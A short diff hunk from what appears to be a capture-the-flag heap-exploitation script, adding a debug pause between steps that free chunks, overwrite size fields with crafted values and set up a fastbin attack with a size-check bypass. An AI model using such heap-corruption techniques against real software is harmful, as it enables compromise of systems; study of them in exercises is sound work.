@@ -58,6 +58,7 @@ allocate(0x60) #10
 #Try to Create trunk overlap to cause a leak.
 free("1")
 free("3")
+raw_input("me")
 fill("2", 49,  "A"*32 + p64(0) + p64(0x31) + p8(0xf0),i=1)
 fill("4", 48,  "A"*32 + p64(0) + p64(0x31),i=1)
 #fast bin attack ,malloc to small bin overlap with size check bypass.
